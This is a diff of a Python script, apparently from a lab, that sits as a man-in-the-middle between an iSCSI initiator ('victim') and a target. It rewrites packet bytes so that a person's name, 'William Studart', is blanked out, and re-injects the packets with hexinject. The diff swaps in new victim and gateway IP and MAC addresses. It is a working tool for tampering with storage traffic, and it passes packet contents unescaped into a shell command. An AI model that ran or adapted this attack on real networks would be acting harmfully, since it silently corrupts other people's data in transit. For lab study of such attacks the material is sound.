@@ -6,16 +6,16 @@ import sys
 iface = "eth0"
 filter = "ip"
 #victim in this case is the initiator
-VICTIM_IP = "172.16.24.109"
-MY_IP = "172.16.24.91"
+VICTIM_IP = "192.168.1.177"
+MY_IP = "192.168.1.170"
 # gateway is the target
-GATEWAY_IP = "172.16.24.188"
+GATEWAY_IP = "192.168.1.176"
 #VICTIM_MAC = "### don't want so show###"
 MY_MAC = "08:00:27:f2:ee:7c"
 #target mac address
-GATEWAY_MAC = "08:00:27:60:74:b2"
+GATEWAY_MAC = "08:00:27:8b:4d:60"
 #initiator mac address
-VICTIM_MAC = "08:00:27:b9:c9:b9" 
+VICTIM_MAC = "08:00:27:0c:48:c2" 
   
 def parse_to_hex(packet):
     # lines below are to redirect hexdump to a file so that we can use in the python script again
@@ -48,9 +48,9 @@ def handle_packet(packet):
         packet[Ether].dst = VICTIM_MAC
         packet_hex = parse_to_hex(packet)
         print packet_hex + "----"
-        # if we find "Test ISCSI File" in hex in the packet, we modify it to "Test ISCSI Hack" and inject
-        if ('54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65' in packet_hex):
-            packet_hex = packet_hex.replace("54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65", "54 65 73 74 20 49 53 43 53 49 20 48 61 63 6B")
+        # if we find "William Studart" in hex in the packet, we modify it to a bunch of espace characters and inject
+        if ('57 69 6C 6C 69 61 6D 20 53 74 75 64 61 72 74' in packet_hex):
+            packet_hex = packet_hex.replace("57 69 6C 6C 69 61 6D 20 53 74 75 64 61 72 74", "20 20 20 20 20 20 20 20 20 20 20 20 20 20 20")
             print "\n\n\nFOUND THE FILE CONTENT!\n\n\n"
             os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
         else: # else we just inject the original packet
